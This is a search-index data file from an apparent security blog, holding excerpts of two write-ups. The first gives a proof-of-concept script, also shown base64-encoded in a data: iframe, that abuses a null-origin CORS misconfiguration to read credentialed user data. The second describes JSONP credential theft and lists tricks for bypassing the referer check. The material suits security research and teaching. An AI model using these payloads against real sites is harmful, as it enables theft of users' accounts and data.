var store = [{
        "title": "Abusing CORS via null origin",
        "excerpt":"POC: &lt;script&gt; var url = \"https://www.victim.com/api/getuser\"; var req = new XMLHttpRequest(); req.open('get',url,true); req.setRequestHeader(\"Accept\", \"application/json\"); req.withCredentials = true; req.send(); req.onreadystatechange= function(){ if(req.readyState == req.DONE) { document.write(this.responseText) }} &lt;/script&gt;This code was converted to the equivalent Base64 string. &lt;iframe width=100% height=100% src=\"data:text/html;base64,PHNjcmlwdD4gdmFyIHVybCA9ICJodHRwczovL3d3dy52aWN0aW0uY29tL2FwaS9nZXR1c2VyIjsgIHZhciByZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtyZXEub3BlbignZ2V0Jyx1cmwsdHJ1ZSk7cmVxLnNldFJlcXVlc3RIZWFkZXIoIkFjY2VwdCIsICJhcHBsaWNhdGlvbi9qc29uIik7cmVxLndpdGhDcmVkZW50aWFscyA9IHRydWU7cmVxLnNlbmQoKTtyZXEub25yZWFkeXN0YXRlY2hhbmdlPSBmdW5jdGlvbigpe2lmKHJlcS5yZWFkeVN0YXRlID09IHJlcS5ET05FKSB7ZG9jdW1lbnQud3JpdGUodGhpcy5yZXNwb25zZVRleHQpfSB9PC9zY3JpcHQ+\"&gt;Further reading: Exploiting CORS misconfigurations for Bitcoins and bounties Exploiting Misconfigured CORS...","categories": [],
        "tags": [],
        "url": "http://localhost:4000/2018/07/04/abusing-cors-via-null-origin.html",
        "teaser":null},{
        "title": "Abusing JSONP to grab user credentials",
        "excerpt":"I find that a company implements cross-domain authentication using JSONP and cookies.There is the login flow: GET /api/cross/getsign?callback=test HTTP/1.1Host: portal.domain.comReferer: http://www.otherdomain.comHTTP/1.1 200 OKtest(crossToken)POST /api/cross/getsign HTTP/1.1Host: www.otherdomain.comcrossToken=[crossToken]HTTP/1.1 200 OKset-cookie: session=xxxxxxxxxxxxxxxxxxxxxxxThe company prevents the JSONP injection via referer check. some common referer check byapss tricks: notdomian.com domain.com.evil.com evil.com/domain.com send a blank refererFortunately,...","categories": [],
        "tags": [],
        "url": "http://localhost:4000/2018/07/04/abusing-jsonp-to-grab-user-credentials.html",
        "teaser":null}]
